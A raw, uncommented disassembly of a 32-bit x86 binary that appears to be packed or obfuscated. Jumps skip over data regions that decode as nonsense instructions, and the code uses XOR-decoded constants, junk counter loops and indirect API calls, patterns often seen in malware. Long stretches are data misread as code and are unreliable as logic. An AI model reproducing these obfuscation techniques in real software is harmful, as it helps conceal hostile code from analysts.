  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	jge    0x4052b8
  40527e:	or     edx,DWORD PTR [eax]
  405280:	(bad)  
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x40527b
  405289:	fisubr DWORD PTR [esi-0x79]
  40528c:	inc    ecx
  40528d:	mov    edx,0x2b80105
  405292:	push   esp
  405293:	push   edx
  405294:	clc    
  405295:	push   ecx
  405296:	enter  0xcab3,0x8
  40529a:	bound  edi,QWORD PTR [ebx+edx*4+0x64]
  40529e:	xor    DWORD PTR [edx-0x3],ebx
  4052a1:	imul   esp,DWORD PTR ds:0xf8d31385,0xe9507000
  4052ab:	fadd   DWORD PTR ds:0x82167979
  4052b1:	fisub  DWORD PTR ds:0x9b06833b
  4052b8:	mov    dh,0x91
  4052ba:	xor    DWORD PTR [ecx-0x7dc69d0e],edx
  4052c0:	stos   BYTE PTR es:[edi],al
  4052c1:	ret    0x863
  4052c4:	xor    DWORD PTR [ebx+0x60ccbe0],edx
  4052ca:	cli    
  4052cb:	mov    esi,0x69b8c23f
  4052d0:	rcr    BYTE PTR [esi-0x3decadfa],0xb7
  4052d7:	in     al,0x29
  4052d9:	pop    ebx
  4052da:	lahf   
  4052db:	out    0x9a,eax
  4052dd:	stc    
  4052de:	xchg   edx,eax
  4052df:	fnsave [edx-0x56a2042d]
  4052e5:	push   edx
  4052e6:	jg     0x4052d8
  4052e8:	stos   BYTE PTR es:[edi],al
  4052e9:	clc    
  4052ea:	fisttp WORD PTR [eax+edx*8]
  4052ed:	jmp    0xae0c:0xdf40a6b6
  4052f4:	shl    al,cl
  4052f6:	scas   al,BYTE PTR es:[edi]
  4052f7:	popa   
  4052f8:	sbb    dh,BYTE PTR [ecx-0x4f]
  4052fb:	mov    eax,ds:0x7303d8f1
  405300:	mov    al,0x2c
  405302:	shl    DWORD PTR [eax-0x2784679f],0xb0
  405309:	inc    bp
  40530b:	dec    ecx
  40530c:	arpl   WORD PTR [esi-0x69],cx
  40530f:	jns    0x4052a4
  405311:	jne    0x4052fb
  405313:	inc    ebx
  405314:	in     al,0xf2
  405316:	(bad)  
  405317:	inc    ebx
  405318:	mov    esi,0xebe788f2
  40531d:	in     eax,0x63
  40531f:	lahf   
  405320:	cli    
  405321:	jo     0x405301
  405323:	jbe    0x40539e
  405325:	in     eax,0x82
  405327:	aam    0x26
  405329:	add    BYTE PTR [edi+0x19],ch
  40532c:	int    0xa1
  40532e:	imul   edx
  405330:	xchg   edx,eax
  405331:	jmp    0x8c83730d
  405336:	sbb    DWORD PTR [ecx],ebx
  405338:	outs   dx,BYTE PTR ds:[esi]
  405339:	cmp    BYTE PTR [eax+0x345b623d],al
  40533f:	out    0x9d,eax
  405341:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405343:	pop    ebp
  405344:	cmc    
  405345:	mov    bh,0xd6
  405347:	mov    ebp,0x3bc1ecf9
  40534c:	jo     0x405378
  40534e:	mov    ebp,0x88dc370c
  405353:	jg     0x405347
  405355:	pop    esi
  405356:	fdivrp st(6),st
  405358:	ja     0x405303
  40535a:	add    edi,edi
  40535c:	aas    
  40535d:	xlat   BYTE PTR ds:[ebx]
  40535e:	div    BYTE PTR [ecx]
  405360:	cld    
  405361:	jno    0x405368
  405363:	pop    ebx
  405364:	not    DWORD PTR [eax]
  405366:	or     DWORD PTR [ecx],0x4a
  405369:	mov    ecx,0xd2042666
  40536e:	repz ss mov esp,0xdd351559
  405375:	mov    eax,ds:0xe3e17d08
  40537a:	cmp    edx,eax
  40537c:	xchg   edx,eax
  40537d:	add    BYTE PTR [edx-0x73],al
  405380:	(bad)  
  405381:	fwait
  405382:	push   es
  405383:	std    
  405384:	cmp    al,dl
  405386:	imul   esi,ecx,0xffffffad
  405389:	es xchg esi,eax
  40538b:	dec    esp
  40538c:	ss sbb al,0xae
  40538f:	(bad)  
  405390:	and    BYTE PTR [esi+0x7c3c8669],ah
  405396:	fidivr DWORD PTR [ebx-0x4f]
  405399:	jl     0x4053b2
  40539b:	xchg   ebp,eax
  40539c:	add    DWORD PTR [eax-0x2c],ecx
  40539f:	inc    edx
  4053a0:	retf   
  4053a1:	push   ss
  4053a2:	adc    eax,0xaa2a598b
  4053a7:	pop    ebp
  4053a8:	rol    bl,cl
  4053aa:	call   0x6e87:0xe37e224
  4053b1:	jnp    0x40536f
  4053b3:	dec    ecx
  4053b4:	push   edx
  4053b5:	push   ds
  4053b6:	lods   al,BYTE PTR ds:[esi]
  4053b7:	inc    esp
  4053b8:	ds inc esi
  4053ba:	and    al,0xc9
  4053bc:	loopne 0x40538c
  4053be:	pusha  
  4053bf:	mov    bl,0xca
  4053c1:	les    esp,FWORD PTR [ebp-0x43d6839b]
  4053c7:	sar    BYTE PTR [edi+0x4d7dbe62],cl
  4053cd:	mov    BYTE PTR [ecx+0x545b2370],ch
  4053d3:	call   0x105aa3b9
  4053d8:	adc    ch,dh
  4053da:	sub    dl,BYTE PTR [esi-0x38]
  4053dd:	aam    0x4f
  4053df:	test   al,0x57
  4053e1:	add    al,0x89
  4053e3:	mov    cl,0x72
  4053e5:	dec    ebx
  4053e6:	in     eax,0x21
  4053e8:	in     eax,dx
  4053e9:	and    DWORD PTR [edx-0x78],eax
  4053ec:	lea    eax,[edx-0x7acf3b4d]
  4053f2:	pop    eax
  4053f3:	add    al,0x33
  4053f5:	inc    esp
  4053f6:	out    dx,eax
  4053f7:	add    BYTE PTR [ebx+0x7738721],bl
  4053fd:	sub    eax,0x77365d74
  405402:	fist   DWORD PTR [eax-0x4d]
  405405:	or     eax,0x8234c57
  40540a:	inc    ecx
  40540b:	stc    
  40540c:	aaa    
  40540d:	enter  0x8922,0xfa
  405411:	out    0xb2,al
  405413:	outs   dx,DWORD PTR ds:[esi]
  405414:	stos   DWORD PTR es:[edi],eax
  405415:	mov    ecx,0x1bcfd0c0
  40541a:	push   ds
  40541b:	jle    0x405415
  40541d:	and    eax,0xea18ef02
  405422:	stos   DWORD PTR es:[edi],eax
  405423:	imul   edx,DWORD PTR [edx],0x9
  405426:	jb     0x405445
  405428:	jno    0x40540f
  40542a:	sub    dl,BYTE PTR [eax-0x1830ea00]
  405430:	cli    
  405431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405432:	(bad)  
  405433:	loop   0x4053bf
  405435:	fwait
  405436:	sbb    dl,BYTE PTR [eax+0x34cb0965]
  40543c:	fucomip st,st(1)
  40543e:	mov    esi,0xe0e089f1
  405443:	sub    BYTE PTR [ebx-0x6],0xf9
  405447:	imul   ecx,ebx,0x19
  40544a:	or     al,0xdb
  40544c:	loopne 0x40547a
  40544e:	pop    ss
  40544f:	(bad)  [edi]
  405451:	pop    edx
  405452:	or     BYTE PTR [ebp-0x1c43fafb],dl
  405458:	in     al,0x9
  40545a:	out    dx,al
  40545b:	jbe    0x4054b7
  40545d:	dec    edx
  40545e:	pop    es
  40545f:	repnz (bad) 
  405462:	scas   al,BYTE PTR es:[edi]
  405463:	adc    eax,0x6e81a1b4
  405468:	shl    BYTE PTR es:[edx-0x78de9462],1
  40546f:	mov    esp,0x9cf2791b
  405474:	jl     0x40545c
  405476:	push   si
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xafa2c60a
  4055e5:	push   es
  4055e6:	mov    ch,0x75
  4055e8:	sub    bh,BYTE PTR ss:[esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x40561f
  4055f1:	pushf  
  4055f2:	push   edi
  4055f3:	ja     0x4055fe
  4055f5:	mov    ebx,0xadca85e1
  4055fa:	add    al,0x97
  4055fc:	ficomp WORD PTR [edi-0x3d]
  4055ff:	mov    ecx,0x24d22392
  405604:	xchg   esi,eax
  405605:	fwait
  405606:	dec    esp
  405607:	je     0x4055c7
  405609:	mov    dl,BYTE PTR [ebp-0x14]
  40560c:	ja     0x4055f0
  40560e:	repz xchg ebp,eax
  405610:	out    dx,al
  405611:	cmp    esi,DWORD PTR [edx]
  405613:	mov    bh,BYTE PTR [ecx-0x469c9f42]
  405619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40561a:	push   esi
  40561b:	mov    ah,0x38
  40561d:	fwait
  40561e:	jl     0x40569e
  405620:	test   al,0x2f
  405622:	add    al,0x99
  405624:	into   
  405625:	fiadd  DWORD PTR [ebp-0x23]
  405628:	cmp    BYTE PTR [esi-0x1d],al
  40562b:	js     0x4056ac
  40562d:	cmp    al,0x49
  40562f:	sub    al,dh
  405631:	mov    ds:0x65cc6974,eax
  405636:	mov    dl,0xe7
  405638:	xchg   BYTE PTR [ecx+0x6edf25e5],al
  40563e:	dec    esp
  40563f:	int    0x5e
  405641:	mov    dl,0x94
  405643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405644:	pusha  
  405645:	addr16 xor bl,ah
  405648:	out    0x6e,eax
  40564a:	xor    ecx,ebx
  40564c:	inc    ecx
  40564d:	push   es
  40564e:	lods   eax,DWORD PTR ds:[esi]
  40564f:	xor    ah,BYTE PTR [ebx+0x314be645]
  405655:	mov    BYTE PTR [edx],dh
  405657:	jmp    0x4056c1
  405659:	push   edx
  40565a:	(bad)  
  40565b:	cmp    esp,DWORD PTR [edx-0x21]
  40565e:	xor    DWORD PTR [ecx+0x74],ecx
  405661:	das    
  405662:	(bad)  
  405663:	fdiv   DWORD PTR [edi+0x2b5fd722]
  405669:	icebp  
  40566a:	loope  0x40566b
  40566c:	or     al,BYTE PTR ds:[esi]
  40566f:	aaa    
  405670:	shl    DWORD PTR [edi-0x12f5d1a5],0xed
  405677:	dec    edx
  405678:	dec    ebp
  405679:	inc    edx
  40567a:	adc    esp,DWORD PTR [ebx]
  40567c:	xchg   edi,eax
  40567d:	sub    eax,0x8cff1d6c
  405682:	mov    ebp,0x406cdc8
  405687:	dec    ebx
  405688:	loopne 0x4056e5
  40568a:	rcr    cl,cl
  40568c:	rcl    esp,1
  40568e:	dec    edi
  40568f:	mov    ds:0xf50166da,al
  405694:	dec    ebx
  405695:	cmp    bh,BYTE PTR [edi]
  405697:	(bad)  
  405698:	sub    al,0xba
  40569a:	in     eax,dx
  40569b:	cs sahf 
  40569d:	adc    edx,DWORD PTR es:[ebp-0x70]
  4056a1:	sar    DWORD PTR [ecx],0xe
  4056a4:	(bad)  
  4056a5:	aad    0x31
  4056a7:	mov    bh,0xd5
  4056a9:	inc    ecx
  4056aa:	cdq    
  4056ab:	sbb    ah,BYTE PTR [eax-0x32]
  4056ae:	pop    eax
  4056af:	(bad)  
  4056b0:	mov    bl,0x3
  4056b2:	dec    eax
  4056b3:	cwde   
  4056b4:	mov    eax,ds:0x94cdf2ea
  4056b9:	stos   DWORD PTR es:[edi],eax
  4056ba:	arpl   WORD PTR [edi],dx
  4056bc:	or     eax,DWORD PTR gs:[edx+0x12]
  4056c0:	inc    eax
  4056c1:	mov    esi,0x6df69839
  4056c6:	xchg   edi,eax
  4056c7:	mov    cl,0xb0
  4056c9:	push   eax
  4056ca:	pop    ebp
  4056cb:	mov    bh,0xa8
  4056cd:	xchg   ebp,eax
  4056ce:	hlt    
  4056cf:	mov    al,0x19
  4056d1:	mov    esi,0x4432cc02
  4056d6:	dec    eax
  4056d7:	or     al,0x69
  4056d9:	dec    edx
  4056da:	pop    es
  4056db:	xchg   edi,eax
  4056dc:	dec    esp
  4056dd:	mov    ds:0xb14295e5,al
  4056e2:	push   eax
  4056e3:	clc    
  4056e4:	jb     0x405703
  4056e6:	mov    cl,0xe5
  4056e8:	mov    bh,0xbd
  4056ea:	sbb    eax,0x67135eaa
  4056ef:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f1:	addr16 mov edi,0x82c5099b
  4056f7:	scas   eax,DWORD PTR es:[edi]
  4056f8:	daa    
  4056f9:	add    ebx,DWORD PTR [ecx]
  4056fb:	sbb    eax,0x55a04b4
  405700:	or     eax,0xd1739feb
  405705:	pushf  
  405706:	mov    bl,0xe8
  405708:	xor    BYTE PTR [ebx+0x10bfc3b],0xa3
  40570f:	(bad)  
  405710:	xor    bh,BYTE PTR [ecx-0x3e09cc3b]
  405716:	jg     0x40577b
  405718:	shr    BYTE PTR [esi-0x1059139c],cl
  40571e:	xor    cl,BYTE PTR [edi]
  405720:	int3   
  405721:	fsub   st(5),st
  405723:	sbb    eax,ebx
  405725:	lods   eax,DWORD PTR ds:[esi]
  405726:	sbb    bl,BYTE PTR [esi]
  405728:	mov    al,0xb
  40572a:	in     eax,0x28
  40572c:	pop    es
  40572d:	add    dh,BYTE PTR [esi+0x48bf28b4]
  405733:	fcmovbe st,st(5)
  405735:	mov    esp,0xdcee3eaf
  40573a:	xor    al,0x99
  40573c:	pop    ax
  40573e:	retf   
  40573f:	inc    esi
  405740:	sbb    esp,DWORD PTR [eax+0xb]
  405743:	inc    esi
  405744:	mov    eax,0x45ce6ced
  405749:	push   ss
  40574a:	inc    si
  40574c:	fsub   QWORD PTR [ecx+eax*2-0x584c2a4c]
  405753:	sbb    BYTE PTR [ebp+eax*8+0x2d],dh
  405757:	jg     0x405769
  405759:	sbb    BYTE PTR [eax-0x36411868],bl
  40575f:	aaa    
  405760:	mov    bl,0xca
  405762:	xchg   BYTE PTR fs:[ecx+0x37210bf1],dl
  405769:	cmp    al,0x2b
  40576b:	addr16 sbb dh,dh
  40576e:	mov    al,ds:0x2980f986
  405773:	test   BYTE PTR [ecx-0x7],bl
  405776:	mov    esp,ecx
  405778:	push   es
  405779:	xchg   ebx,eax
  40577a:	jae    0x405713
  40577c:	sbb    esp,ebp
  40577e:	cmp    edi,DWORD PTR [ebx-0x4f]
  405781:	out    0x54,eax
  405783:	dec    ecx
  405784:	mov    WORD PTR [edi-0x11],?
  405787:	ins    BYTE PTR es:[edi],dx
  405788:	cdq    
  405789:	popf   
  40578a:	fwait
  40578b:	or     bl,BYTE PTR [ecx]
  40578d:	push   edi
  40578e:	cmp    al,0xf9
  405790:	xchg   edi,eax
  405791:	push   ebx
  405792:	add    eax,0xf5fb723f
  405797:	pop    eax
  405798:	add    dh,BYTE PTR [edi+eiz*2]
  40579b:	in     al,0x32
  40579d:	jb     0x4057cb
  40579f:	or     edi,ebx
  4057a1:	aad    0xa2
  4057a3:	inc    esi
  4057a4:	fprem1 
  4057a6:	xchg   DWORD PTR [ecx+0x39],esp
  4057a9:	push   esp
  4057aa:	mov    BYTE PTR [esi-0x31],ch
  4057ad:	iret   
  4057ae:	jns    0x40577d
  4057b0:	ja     0x405783
  4057b2:	dec    edx
  4057b3:	call   0x42238997
  4057b8:	jns    0x405742
  4057ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057bb:	push   edx
  4057bc:	sub    eax,DWORD PTR [ecx+0x69d490a5]
  4057c2:	cmc    
  4057c3:	popa   
  4057c4:	or     eax,0x99963afa
  4057c9:	push   0x15
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42ec5b,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	int3   
  4059a3:	inc    ax
  4059a5:	xchg   ecx,eax
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x40596c
  4059af:	popf   
  4059b0:	ja     0x405998
  4059b2:	mov    esp,0x61fdb3f9
  4059b7:	fld    QWORD PTR [ebx+esi*1-0x37379089]
  4059be:	pop    edi
  4059bf:	call   0x21a5:0xdd6e5b71
  4059c6:	rcr    esp,0x26
  4059c9:	std    
  4059ca:	fdivr  DWORD PTR [ecx-0x7c]
  4059cd:	push   eax
  4059ce:	and    al,0x1e
  4059d0:	adc    DWORD PTR [ecx-0x18],ebx
  4059d3:	sub    eax,0xa6d074b8
  4059d8:	cs jecxz 0x40595c
  4059db:	das    
  4059dc:	dec    edx
  4059dd:	hlt    
  4059de:	sbb    al,BYTE PTR [edx+0x7]
  4059e1:	pusha  
  4059e2:	lods   eax,DWORD PTR ds:[esi]
  4059e3:	dec    edi
  4059e4:	sbb    eax,DWORD PTR [edi+0x3f38da5f]
  4059ea:	test   al,0xeb
  4059ec:	xchg   edx,eax
  4059ed:	fs cld 
  4059ef:	inc    ebp
  4059f0:	(bad)  
  4059f1:	popa   
  4059f2:	rcr    BYTE PTR [ebp+0x61],1
  4059f5:	mov    esp,0x5a8fea7
  4059fa:	sub    ebx,ebp
  4059fc:	or     DWORD PTR [ecx+ecx*8],esp
  4059ff:	push   es
  405a00:	mov    eax,ds:0x50d47721
  405a05:	pop    ss
  405a06:	out    0x8b,eax
  405a08:	(bad)
  405a0c:	xor    dh,bh
  405a0e:	das    
  405a0f:	xchg   ebp,eax
  405a10:	(bad)  
  405a12:	jp     0x4059ad
  405a14:	call   0x525d:0x25f376db
  405a1b:	int    0xb9
  405a1d:	jl     0x405a4a
  405a1f:	popf   
  405a20:	xchg   esp,eax
  405a21:	or     dh,ah
  405a23:	adc    al,0x38
  405a25:	arpl   WORD PTR [esi],cx
  405a27:	imul   ecx,edi,0xfb4e9717
  405a2d:	mov    esp,0x75f2b588
  405a32:	fstp   TBYTE PTR [ebx]
  405a34:	push   es
  405a35:	adc    DWORD PTR [ebp+0x30a9ae4f],eax
  405a3b:	jmp    0x8ae82667
  405a40:	(bad)  
  405a41:	ret    0xbbf5
  405a44:	test   al,0x2c
  405a46:	scas   eax,DWORD PTR es:[edi]
  405a47:	shl    BYTE PTR [edx-0x712620f8],1
  405a4d:	inc    edi
  405a4e:	mov    dl,0x9e
  405a50:	ret    
  405a51:	pop    ebx
  405a52:	push   edi
  405a53:	jle    0x405a28
  405a55:	adc    DWORD PTR [edi-0x2531b142],0xdbec03cd
  405a5f:	jmp    0x405abe
  405a61:	mov    eax,ds:0x5704610
  405a66:	aad    0x25
  405a68:	and    DWORD PTR [edi+0x578f310],esi
  405a6e:	sub    eax,0x323996a2
  405a73:	mov    ds:0x72e40ce4,eax
  405a78:	into   
  405a79:	mov    esi,DWORD PTR [esi]
  405a7b:	cwde   
  405a7c:	test   ch,dl
  405a7e:	push   ss
  405a7f:	popa   
  405a80:	cmp    eax,DWORD PTR [edx+ecx*2]
  405a83:	(bad)  
  405a84:	jns    0x405abc
  405a86:	mov    ah,0xc5
  405a88:	retf   
  405a89:	cdq    
  405a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a8b:	xchg   esp,eax
  405a8c:	add    eax,0x359570b7
  405a91:	bound  ebp,QWORD PTR [ebx+ebx*8]
  405a94:	stos   DWORD PTR es:[edi],eax
  405a95:	sub    eax,DWORD PTR [esi+0x612b8526]
  405a9b:	dec    ebp
  405a9c:	fs mov ebp,0x1d043108
  405aa2:	mov    dh,0x44
  405aa4:	addr16 pushf 
  405aa6:	icebp  
  405aa7:	push   esp
  405aa8:	adc    eax,0x80ca0f6
  405aad:	repz pop ebx
  405aaf:	inc    ebp
  405ab0:	add    eax,0x69264e90
  405ab5:	in     al,dx
  405ab6:	cwde   
  405ab7:	pushf  
  405ab8:	pop    edi
  405ab9:	leave  
  405aba:	(bad)  
  405abc:	int    0x87
  405abe:	sbb    al,0x5a
  405ac0:	jns    0x405a4f
  405ac2:	mov    WORD PTR [ebp+0x52a02d6f],ss
  405ac8:	mov    bl,BYTE PTR [edi+0x3d]
  405acb:	lock movq QWORD PTR [ebx+0x3385959c],mm7
  405ad3:	stos   DWORD PTR es:[edi],eax
  405ad4:	push   edx
  405ad5:	pop    edi
  405ad7:	mov    dh,0xea
  405ad9:	push   esi
  405ada:	xor    BYTE PTR [ebp-0x156a7be0],bl
  405ae0:	fdiv   DWORD PTR [ebx-0x64015676]
  405ae6:	jno    0x405b1d
  405ae8:	test   bh,dl
  405aea:	sar    DWORD PTR [eax],0x4c
  405aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aee:	pushf  
  405aef:	(bad)  
  405af0:	mov    esi,0xb9a998b3
  405af5:	arpl   WORD PTR [esi+0x38],ax
  405af8:	stc    
  405af9:	xchg   esi,eax
  405afa:	iret   
  405afb:	(bad)  
  405afd:	popa   
  405afe:	inc    edi
  405aff:	lods   eax,DWORD PTR ds:[esi]
  405b00:	or     DWORD PTR [esi-0x75],edi
  405b03:	clc    
  405b04:	mov    ah,0x6e
  405b06:	daa    
  405b07:	cld    
  405b08:	sub    al,0x45
  405b0a:	lds    ebp,FWORD PTR [eax+0x28]
  405b0d:	push   esi
  405b0e:	test   al,0x6c
  405b10:	gs jnp 0x405b3b
  405b13:	cs cld 
  405b15:	lds    ecx,FWORD PTR [ecx+0x600ea3fa]
  405b1b:	jns    0x405b19
  405b1d:	arpl   WORD PTR [edx+0x5f],di
  405b20:	adc    BYTE PTR [edi+0x5857f794],bh
  405b26:	neg    BYTE PTR ds:0xf7940ee5
  405b2c:	sbb    edx,DWORD PTR [edx+0x62]
  405b2f:	pop    es
  405b30:	inc    edx
  405b31:	in     eax,dx
  405b32:	pusha  
  405b33:	pop    ds
  405b34:	jge    0x405b09
  405b36:	jb     0x405b3e
  405b38:	addr16 and al,0x10
  405b3b:	xchg   esp,eax
  405b3c:	mov    eax,0x910025f
  405b41:	pop    ebp
  405b42:	cmp    ch,ah
  405b44:	dec    esp
  405b45:	sbb    ecx,0xffffff91
  405b48:	mov    DWORD PTR [edi-0x48],esp
  405b4b:	dec    ebp
  405b4c:	arpl   bx,sp
  405b4e:	or     BYTE PTR [edi],ah
  405b50:	cmp    al,0x64
  405b52:	ret    0x82ec
  405b55:	je     0x405b19
  405b57:	aas    
  405b58:	sahf   
  405b59:	lock les ebp,FWORD PTR [ecx]
  405b5c:	inc    DWORD PTR [edx]
  405b5e:	cmc    
  405b5f:	sub    ah,ch
  405b61:	(bad)  [edi+ebx*8]
